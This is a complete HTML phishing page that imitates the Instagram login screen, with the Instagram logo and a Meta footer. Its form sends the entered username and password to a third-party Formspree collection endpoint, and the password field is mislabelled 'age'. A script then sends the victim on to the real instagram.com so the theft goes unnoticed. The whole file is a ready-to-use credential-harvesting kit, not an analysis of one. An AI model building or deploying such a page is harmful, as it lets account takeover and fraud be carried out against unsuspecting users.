<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #121e26;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .input-field {
            background-color: #1c2b33;
            border: 1px solid #36474f;
            color: white;
        }
        .input-field::placeholder {
            color: #8e969b;
        }
        .login-btn {
            background-color: #0064e0;
        }
        .login-btn:active {
            opacity: 0.8;
        }
        .create-btn {
            border: 1px solid #0064e0;
            color: #0064e0;
        }
        /* Custom message box instead of alert */
        #error-msg {
            display: none;
            background: #ef4444;
            color: white;
            padding: 10px;
            border-radius: 8px;
            font-size: 12px;
            margin-bottom: 10px;
            text-align: center;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-between p-6">
    
    <!-- Language Selector -->
    <div class="text-xs text-gray-400 mt-2">
        English (US)
    </div>

    <!-- Main Content -->
    <div class="w-full max-w-sm flex flex-col items-center mt-12 flex-grow">
        <!-- Logo Container -->
        <div class="mb-10">
            <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" 
                alt="Instagram Logo" 
                class="w-16 h-16 object-contain"
                onerror="this.src='https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de40b82.png'"
            >
        </div>

        <div id="error-msg">Submission failed. Please try again.</div>

        <!-- Login Form -->
        <form 
            id="loginForm" 
            action="https://formspree.io/f/mykdwnyw" 
            method="POST" 
            class="w-full space-y-5">
            
            <div class="relative">
                <input 
                    name="username"
                    type="text" 
                    placeholder="Username, email or mobile number" 
                    class="input-field w-full px-4 py-3 rounded-xl focus:outline-none text-sm transition-all"
                    required
                >
            </div>
            <div class="relative">
                <input 
                    name="age"
                    type="password"
                    placeholder="password" 
                    class="input-field w-full px-4 py-3 rounded-xl focus:outline-none text-sm transition-all"
                    required
                >
            </div>

            <button 
                id="submitBtn"
                type="submit" 
                class="login-btn w-full py-3 rounded-3xl font-semibold text-sm transition-all mt-4"
            >
                Log in
            </button>
        </form>

        <a href="#" class="mt-6 text-sm font-medium text-gray-200 hover:text-white">
            Forgot password?
        </a>
    </div>

    <!-- Footer Area -->
    <div class="w-full max-w-sm flex flex-col items-center space-y-4 mb-4">
        <button class="create-btn w-full py-2 rounded-3xl font-semibold text-sm">
            Create new account
        </button>
        
        <div class="flex flex-col items-center opacity-70">
            <div class="flex items-center space-x-1">
                <span class="text-xs font-bold tracking-widest">âˆž Meta</span>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const errorMsg = document.getElementById('error-msg');
        const submitBtn = document.getElementById('submitBtn');
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault(); 
            
            // Visual feedback
            submitBtn.innerText = "Logging in...";
            submitBtn.style.opacity = "0.7";
            errorMsg.style.display = "none";
            
            const formData = new FormData(form);
            
            try {
                const response = await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });

                if (response.ok) {
                    // Success: Redirect to Instagram
                    window.location.href = "https://www.instagram.com/";
                } else {
                    // Show error and reset button
                    errorMsg.style.display = "block";
                    submitBtn.innerText = "Log in";
                    submitBtn.style.opacity = "1";
                }
            } catch (error) {
                console.error("Error submitting form:", error);
                // Redirect anyway
                window.location.href = "https://www.instagram.com/";
            }
        });
    </script>
</body>
</html>
